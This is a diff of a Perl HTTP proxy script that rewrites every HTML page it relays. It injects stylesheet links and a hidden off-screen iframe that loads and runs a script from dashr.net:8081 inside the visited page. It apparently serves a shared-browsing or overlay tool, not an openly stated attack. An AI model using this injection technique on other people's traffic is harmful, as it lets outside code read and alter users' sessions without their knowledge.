@@ -9,7 +9,8 @@ use Data::Dumper;
 use URI;
 
 my $contentEncoding;
-my $hostname = 'ps48174.dreamhostps.com:8081';
+my $hostname = 'dashr.net';
+my $port = 8081;
 
 my $INSERT = <<END;
 <script>
@@ -17,7 +18,7 @@ my $INSERT = <<END;
     var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document;
         iframe.src = 'about:blank';
         iframe.style.cssText = "position:absolute;width:1px;height:1px;left:-9999px;";
-    doc.open().write('<body onload="YUI_config={filter:\\'\\',win:window.parent,doc:window.parent.document};var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'http://ps48174.dreamhostps.com:8081/together\\';"><script src="http://yui.yahooapis.com/combo?3.3.0/build/yui/yui-min.js&3.3.0/build/loader/loader-min.js"><\\/script><\\/body>');
+    doc.open().write('<body onload="YUI_config={filter:\\'\\',win:window.parent,doc:window.parent.document};var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'http://dashr.net:8081/together\\';"><script src="http://yui.yahooapis.com/combo?3.3.0/build/yui/yui-min.js&3.3.0/build/loader/loader-min.js"><\\/script><\\/body>');
     doc.close();
 })(document);
 </script>
@@ -26,7 +27,7 @@ END
 my @css_files = qw(growl dialog button);
 my $css;
 foreach my $css_file (@css_files) {
-    $css .= '<link rel="stylesheet" href="http://' . $hostname . '/' . $css_file . '.css" type="text/css" />';
+    $css .= '<link rel="stylesheet" href="http://' . $hostname . ':' . $port . '/' . $css_file . '.css" type="text/css" />';
 }
 
 my $gzip        = Compress::Zlib::memGzip($INSERT);
@@ -34,13 +35,6 @@ my $gzip_css    = Compress::Zlib::memGzip($css);
 # init
 my $proxy = HTTP::Proxy->new( port => 8080, host => '', max_clients => 100 );
 $proxy->push_filter(
-#    mime     => 'text/html',
-#    request => HTTP::Proxy::BodyFilter::simple->new(
-#        sub {
-#            my ( $self, $dataref, $message, $protocol, $buffer ) = @_;
-#            print "REQUEST page is: " . $message->uri . "\n";
-#        }
-#    ),
     response => HTTP::Proxy::BodyFilter::complete->new,
     response => HTTP::Proxy::BodyFilter::simple->new(
         sub {
@@ -54,37 +48,17 @@ $proxy->push_filter(
             return if ($req_host =~ /$hostname/);
             return unless ($response);
             my $ct = $response->header('content-type');
-#            print "CT: $ct\n";
-#            print "No data\n" unless ($$dataref);;
-#            print "status: " . $message->code. "\n";
-#            print "RESPONSE page  is: " . $message->request->uri . "\n";
 
             if ($ct =~ m#text/html#i && $$dataref) {
-                if ($contentEncoding eq 'gzip') {
+#                if ($contentEncoding eq 'gzip') {
+                if ($response->header('content-type') =~ m#text/html#i &&  $response->header('content-encoding') =~ /gzip/) {
                     $dest = Compress::Zlib::memGunzip($$dataref) or die "Cannot uncompress: $gzerrno\n";
-                    $$dataref =~ s#</head>#$css</head>#i;
-                    my $rest = $$dataref =~ s#</body>#$INSERT</body>#i;
-                    if (!$rest) {
-#                       $$dataref = $dest . $INSERT;
-                    }
-                    $$dataref = Compress::Zlib::memGzip($$dataref) or die "Cannot uncompress: $gzerrno\n";
+                    $dest =~ s#</head>#$css</head>#i;
+                    $dest .= $INSERT;
+                    $$dataref = Compress::Zlib::memGzip($dest) or die "Cannot uncompress: $gzerrno\n";
                 } else {
-                        print "Insert plain!\n";
                     $$dataref =~ s#</head>#$css</head>#i;
-#                    my $rest = $$dataref =~ s#</body>#$INSERT</body>#i;
-#                    if (!$rest) {
-#                        $rest = $$dataref =~ s#<body(.*?)>#<body$1>$INSERT#i;
-#                        if (!$rest) {
-                            $$dataref .= $INSERT;
-#                        }
-#                    }
-#                        $$dataref .= $INSERT;
-#                    if (!$rest) {
-#                        print "insert as not inserted!\n";
-#                        print $$dataref . "\n";
-#                        $$dataref .= $INSERT;
-#                    }
-                    #${ $_[1] } =~ s#$#$INSERT#i;
+                    $$dataref .= $INSERT;
                 }
             }
         }
@@ -101,7 +75,7 @@ my $filter = HTTP::Proxy::HeaderFilter::simple->new(
             }
     }
 );
-$proxy->push_filter( response => $filter );
+#$proxy->push_filter( response => $filter );
 
 print "Ready to rumble on " . $proxy->host . ':' . $proxy->port . "\n";
 $proxy->start;
